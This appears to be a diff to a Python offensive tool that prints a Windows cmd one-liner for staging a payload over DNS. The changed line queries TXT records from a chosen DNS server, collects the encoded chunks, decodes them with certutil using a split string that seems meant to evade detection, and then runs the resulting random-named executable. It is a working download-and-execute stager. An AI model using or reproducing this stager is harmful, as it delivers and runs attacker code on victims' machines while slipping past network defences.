@@ -62,7 +62,7 @@ print(f"""
 ==========
 Please Change Your DNS Server IP:
 
-cmd /v:on /Q /c "for /l %i in (0,1,{len(L)}) do (set a= && set b= && for /f "tokens=*" %j in ('nslookup -qt^=TXT baidu%i.com 192.168.2.3 ^| findstr "exec"') do (set a=%j && echo !a:~5,-2! >> decode.txt))"
+cmd /v:on /Q /c "for /l %i in (0,1,{len(L)}) do (set a= && set b= && for /f "tokens=*" %j in ('nslookup -qt^=TXT baidu%i.com 192.168.2.3 ^| findstr "exec"') do (set a=%j && echo !a:~5,-2! >> decode.txt)) && set output=%RANDOM%.exe && certutil -de""code decode.txt "%output%" && cmd /c "%output%""
 
 =========
 """)
